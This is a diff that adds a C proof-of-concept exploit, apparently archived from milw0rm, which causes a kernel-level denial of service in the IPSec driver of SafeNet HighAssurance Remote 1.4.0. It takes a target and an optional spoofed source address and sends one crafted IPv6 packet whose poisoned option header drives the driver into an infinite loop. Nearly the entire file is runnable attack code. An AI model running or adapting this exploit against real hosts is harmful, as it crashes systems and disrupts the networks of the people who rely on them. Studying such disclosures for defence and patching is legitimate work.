@@ -1,0 +1,129 @@
+/* safenet-dos.c
+ *
+ * SafeNet HighAssurance Remote ~1.4.0 Ring0 DoS (win32)
+ * by John Anderson <john@ev6.net>
+ *    mu-b <mu-b@digit-labs.org>
+ * - Mar 2006 - June 2007
+ *
+ * - Tested on: SafeNet HighAssurance Remote 1.4.0 (Build 12) (win32)
+ *
+ * Kernel level (Ring0) DoS in IPv6 support of IPSecDrv.sys
+ * (causes an infinite loop in searching option headers 0x1000BEB0).
+ *
+ * This POC only works on a local subnet since it sends an invalid packet
+ * and any sensible router will drop it. However, this is exploitable
+ * remotely with IPv6.
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <libnet.h>
+#include <sys/time.h>
+
+#define IPV4_HDR_LEN  20
+#define IPV6_HDR_LEN  40
+#define UDP_LEN       16
+
+struct opt
+{
+  u_char nxt_hdr;
+  u_char opt_len;
+};
+
+unsigned long int
+lookup (char *hostname)
+{
+  struct hostent *name;
+  unsigned long int address;
+
+  if ((address = inet_addr (hostname)) != -1)
+    return address;
+  if ((name = gethostbyname (hostname)) == NULL)
+    return -1;
+
+  memcpy (&address, name->h_addr, name->h_length);
+  return (address);
+}
+
+int
+main (int argc, char **argv)
+{
+  u_char *buf = NULL;
+
+  /* libnet vars */
+  char errbuf[LIBNET_ERRBUF_SIZE];
+  libnet_t *lnsock;
+  char *device = NULL;
+
+  /* packet vars */
+  struct ip *ip_hdr = NULL;
+  struct opt *opt_hdr = NULL;
+  u_int32_t src_ip = 0, dst_ip = 0;
+
+  printf ("SafeNet HighAssurance Remote ~1.4.0 Ring0 DoS POC\n"
+          "by John Anderson <john@ev6.net>\n"
+          "   mu-b <mu-b@digit-labs.org>\n\n");
+
+  if (!argv[1])
+    {
+      printf ("Usage: %s <destination> [source]\n", argv[0]);
+      exit (EXIT_FAILURE);
+    }
+
+  /* allocate space for packet */
+  if ((buf = malloc (IPV6_HDR_LEN + UDP_LEN)) == NULL)
+    {
+      perror ("malloc: ");
+      exit (EXIT_FAILURE);
+    }
+
+  /* initialise libnet */
+  lnsock = libnet_init (LIBNET_RAW4_ADV, device, errbuf);
+  if (lnsock == NULL)
+    {
+      fprintf (stderr, "libnet_init() failed: %s", errbuf);
+      exit (-1);
+    }
+
+  if (!argv[2])
+    src_ip = lookup ("127.0.0.1");
+  else
+    src_ip = lookup (argv[2]);
+
+  dst_ip = lookup (argv[1]);
+
+  /* Build the pseudo-IPv4 header */
+  memset (buf, 0, sizeof buf);
+  ip_hdr = (struct ip *) buf;
+  ip_hdr->ip_v = 6;
+  ip_hdr->ip_hl = 0;
+  ip_hdr->ip_tos = 0;
+  ip_hdr->ip_len = htons (IPV6_HDR_LEN + UDP_LEN);
+  ip_hdr->ip_id = htons (0);
+  ip_hdr->ip_off = htons (0);
+  ip_hdr->ip_ttl = 0;
+  ip_hdr->ip_p = 0;
+  ip_hdr->ip_sum = 0;
+  ip_hdr->ip_src.s_addr = src_ip;
+  ip_hdr->ip_dst.s_addr = dst_ip;
+
+  /* Build option header with poison bytes */
+  opt_hdr = (struct opt *) (buf + IPV6_HDR_LEN);
+  opt_hdr->nxt_hdr = 0x3C;      /* != 0x3B */
+  opt_hdr->opt_len = 0x07;      /* length n such that:-
+                                 *(((u_char *)opt_hdr) + n * 2) != 0x3B &&
+                                 *(((u_char *)opt_hdr) + n * 2 + 1) == 0x00 &&
+                                 n * 2 < IPV6_HDR_LEN + UDP_LEN */
+                                /* a value of 0x00 will suffice!@$%! */
+
+  printf ("Attacking %s", argv[1]);
+  libnet_write_raw_ipv4 (lnsock, buf, IPV6_HDR_LEN + UDP_LEN);
+  printf (".\n");
+
+  return (EXIT_SUCCESS);
+}
+
+// milw0rm.com [2007-06-08]
